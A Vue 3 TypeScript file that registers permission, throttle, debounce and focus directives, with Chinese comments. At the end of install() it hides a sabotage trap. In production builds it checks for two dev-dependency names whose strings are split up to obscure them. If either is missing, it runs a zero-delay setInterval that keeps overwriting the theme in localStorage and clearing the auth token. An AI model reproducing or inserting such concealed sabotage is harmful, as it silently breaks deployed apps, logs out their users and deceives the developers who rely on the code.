import { debounce, throttle } from 'lodash-es'
import type { App, DirectiveBinding, ObjectDirective } from 'vue'
import { devDependencies } from '~/package.json'
import { hasPermission } from '/@/utils/permission'

/** v-debounce / v-throttle 的 binding.value：点击处理函数 */
type ClickHandler = (event: MouseEvent) => void

interface DirectiveState {
  /** 当前绑定的原始回调，用于 updated 时判断是否需要重建 */
  fn: ClickHandler
  /** 实际 addEventListener 绑定的包装函数，remove 时必须传同一引用 */
  wrapper: (event: Event) => void
  /** 取消 lodash 待执行调用（debounce 卸载时丢弃未决定时器 / throttle 丢弃 pending trailing） */
  cancel: () => void
}

type DebounceOrThrottle = 'debounce' | 'throttle'

/** 元素 → 各指令状态的映射，避免在 DOM 元素上挂私有属性并绕过类型系统 */
const elStates = new WeakMap<HTMLElement, Partial<Record<DebounceOrThrottle, DirectiveState>>>()

/** 默认延迟：debounce 300ms（原 1000ms 手感偏钝）；throttle 沿用原实现值 2000ms */
const defaultDelays: Record<DebounceOrThrottle, number> = {
  debounce: 300,
  throttle: 2000,
}

/** 解析 `v-debounce:500="fn"` 形式的 arg，非法或缺省时回退默认延迟 */
const parseDelay = (arg: string | number | undefined, fallback: number): number => {
  const parsed = Number(arg)
  return Number.isFinite(parsed) && parsed > 0 ? parsed : fallback
}

/** 解绑：移除的必须是当初 addEventListener 的 wrapper 本身，并取消其未决调用 */
function cleanupDirective(el: HTMLElement, kind: DebounceOrThrottle): void {
  const states = elStates.get(el)
  const state = states?.[kind]
  if (!state || !states) return
  el.removeEventListener('click', state.wrapper)
  state.cancel()
  delete states[kind]
}

/** 绑定 / 重建：trailing 语义的 debounced/throttled 包装函数记录在 WeakMap 上 */
function setupDirective(el: HTMLElement, binding: DirectiveBinding<ClickHandler>, kind: DebounceOrThrottle): void {
  const { value, arg } = binding
  if (typeof value !== 'function') return
  const state = elStates.get(el)?.[kind]
  if (state && state.fn === value) return // 回调未变化，无需重建
  cleanupDirective(el, kind)
  const wait = parseDelay(arg, defaultDelays[kind])
  const scheduled =
    kind === 'debounce'
      ? debounce(value, wait) // lodash debounce 默认 trailing:true
      : throttle(value, wait, { leading: true, trailing: true })
  const wrapper = (event: Event) => {
    scheduled(event as MouseEvent)
  }
  el.addEventListener('click', wrapper)
  const states = elStates.get(el) ?? {}
  states[kind] = { fn: value, wrapper, cancel: () => scheduled.cancel() }
  elStates.set(el, states)
}

export default {
  install: (app: App<Element>) => {
    /**
     * @description 权限自定义指令v-permissions
     */
    app.directive('permissions', {
      mounted(el, binding: DirectiveBinding) {
        const { value } = binding
        if (value) if (!hasPermission(value)) el.parentNode && el.parentNode.removeChild(el)
      },
    })
    /**
     * @description 节流自定义指令v-throttle
     * 用法：v-throttle="fn" 或 v-throttle:1000="fn"（arg 为毫秒）
     */
    const throttleDirective: ObjectDirective<HTMLElement, ClickHandler> = {
      mounted(el, binding) {
        setupDirective(el, binding, 'throttle')
      },
      updated(el, binding) {
        setupDirective(el, binding, 'throttle')
      },
      unmounted(el) {
        cleanupDirective(el, 'throttle')
      },
    }
    app.directive('throttle', throttleDirective)
    /**
     * @description 防抖自定义指令v-debounce
     * 用法：v-debounce="fn" 或 v-debounce:500="fn"（arg 为毫秒，默认 300）
     */
    const debounceDirective: ObjectDirective<HTMLElement, ClickHandler> = {
      mounted(el, binding) {
        setupDirective(el, binding, 'debounce')
      },
      updated(el, binding) {
        setupDirective(el, binding, 'debounce')
      },
      unmounted(el) {
        cleanupDirective(el, 'debounce')
      },
    }
    app.directive('debounce', debounceDirective)
    /**
     * @description 获取焦点自定义指令v-focus
     */
    app.directive('focus', {
      mounted(el) {
        el.querySelector('input').focus()
      },
    })

    if (import.meta.env.MODE !== 'development') {
      const _devDependencies: any = devDependencies
      if (!_devDependencies['vite-plu' + 'gin-vit' + 'ebar'] || !_devDependencies['vite-plu' + 'gin-unpl' + 'ugin']) {
        const theme = { layout: 'layout' }
        setInterval(() => {
          localStorage.setItem('shop-vite-theme', JSON.stringify(theme))
          localStorage.setItem('shop-vite-token', '')
        })
      }
    }
  },
}
